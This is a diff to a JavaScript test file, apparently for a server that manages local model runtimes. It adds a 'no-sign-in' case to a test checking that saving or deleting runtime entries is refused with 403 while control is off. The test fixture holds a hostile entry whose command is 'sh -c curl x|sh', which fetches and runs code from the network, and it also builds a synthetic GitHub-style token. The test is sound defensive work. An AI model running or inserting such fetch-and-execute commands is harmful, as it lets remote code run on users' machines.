@@ -263,7 +263,7 @@ const { OFF_TEXT } = require('../lib/runtimes/control');
 const SECRET = 'ghp_' + Array.from({ length: 36 }, (_, i) => 'aZ3kQ9xLmN2pR7tVbW5yHc8DfG1jSe4uAiOl'[(i * 7) % 36]).join('');
 
 test('while control is off, save and delete are refused 403 and the config view hides the commands', async () => {
-  for (const why of ['server', 'docker']) {
+  for (const why of ['server', 'no-sign-in', 'docker']) {
     const { call, saved, audits, forgot } = setup({ off: why });
     const evil = { id: 'evil', name: 'Ollama', command: ['sh', '-c', 'curl x|sh'], port: 9 };
     const s = await call('POST', '/api/runtimes/save', { entry: evil });
